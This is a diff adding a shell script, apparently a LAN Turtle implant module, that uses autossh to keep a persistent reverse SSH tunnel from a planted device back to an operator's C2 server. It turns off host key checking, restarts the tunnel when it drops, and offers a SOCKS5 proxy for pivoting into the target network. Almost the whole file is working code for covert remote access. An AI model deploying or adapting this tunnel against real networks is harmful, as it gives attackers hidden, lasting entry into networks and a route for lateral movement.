@@ -1,0 +1,79 @@
+#!/bin/sh
+# ================================================================
+#  LAN Turtle Module — autossh-reverse / start
+#  Description : Establishes a persistent reverse SSH tunnel from the
+#                LAN Turtle to the operator's C2 server. Forwards
+#                the Turtle's local SSH port (22) to a remote port
+#                on the C2, allowing inbound SSH access through NAT.
+#                AutoSSH monitors the tunnel and restarts it if it
+#                drops. Optional SOCKS5 proxy on C2 for pivoting.
+#  Device      : LAN Turtle (OpenWrt / Debian)
+#  Deploy      : Copy to /etc/turtle/modules/autossh-reverse/
+#                Enable via Turtle menu: Modules → autossh-reverse → Start
+#  Configure   : Edit C2_HOST, C2_USER, C2_PORT, LOCAL_PORT below
+#                or set via /etc/turtle/modules/autossh-reverse/config
+# ================================================================
+
+MODULE_DIR=/etc/turtle/modules/autossh-reverse
+CONFIG="${MODULE_DIR}/config"
+LOG=/tmp/autossh-reverse.log
+
+# ── Load config or use defaults ───────────────────────────────────
+C2_HOST=""
+C2_USER="root"
+C2_PORT="2222"       # Remote port on C2 that maps to Turtle SSH
+LOCAL_PORT="22"      # Local port to forward (Turtle's SSH)
+SOCKS_PORT="1080"    # Remote SOCKS5 proxy port (0 = disabled)
+SSH_KEY="${MODULE_DIR}/id_rsa"
+AUTOSSH_POLL=30      # Seconds between tunnel health checks
+
+if [ -f "$CONFIG" ]; then
+    # shellcheck source=/dev/null
+    . "$CONFIG"
+fi
+
+if [ -z "$C2_HOST" ]; then
+    echo "[!] C2_HOST not configured. Edit ${CONFIG}" | tee -a "$LOG"
+    exit 1
+fi
+
+if [ ! -f "$SSH_KEY" ]; then
+    echo "[!] SSH key not found at ${SSH_KEY}" | tee -a "$LOG"
+    echo "[!] Generate with: ssh-keygen -t ed25519 -f ${SSH_KEY} -N ''" | tee -a "$LOG"
+    echo "[!] Then add public key to C2 authorized_keys" | tee -a "$LOG"
+    exit 1
+fi
+
+echo "[*] Starting autossh reverse tunnel to ${C2_USER}@${C2_HOST}" | tee -a "$LOG"
+echo "[*] Turtle SSH will be available at ${C2_HOST}:${C2_PORT}" | tee -a "$LOG"
+
+# Build tunnel arguments
+TUNNEL_ARGS="-R ${C2_PORT}:localhost:${LOCAL_PORT}"
+
+# Optional SOCKS5 dynamic proxy for pivoting through Turtle's network
+if [ "${SOCKS_PORT}" != "0" ]; then
+    TUNNEL_ARGS="${TUNNEL_ARGS} -R ${SOCKS_PORT}:localhost:${SOCKS_PORT} -D ${SOCKS_PORT}"
+    echo "[*] SOCKS5 proxy: ${C2_HOST}:${SOCKS_PORT}" | tee -a "$LOG"
+fi
+
+# Start autossh (OpenWrt: autossh package; Debian: apt install autossh)
+export AUTOSSH_POLL="$AUTOSSH_POLL"
+export AUTOSSH_GATETIME=0
+export AUTOSSH_LOGFILE="$LOG"
+
+autossh -M 0 -f -N \
+    -o StrictHostKeyChecking=no \
+    -o ServerAliveInterval=15 \
+    -o ServerAliveCountMax=3 \
+    -o ExitOnForwardFailure=yes \
+    -o BatchMode=yes \
+    -i "$SSH_KEY" \
+    -p 22 \
+    $TUNNEL_ARGS \
+    "${C2_USER}@${C2_HOST}" \
+    >> "$LOG" 2>&1 &
+
+AUTOSSH_PID=$!
+echo "$AUTOSSH_PID" > /tmp/autossh-reverse.pid
+echo "[+] AutoSSH started (PID: $AUTOSSH_PID)" | tee -a "$LOG"
+echo "[+] Connect from C2: ssh -p ${C2_PORT} root@localhost" | tee -a "$LOG"
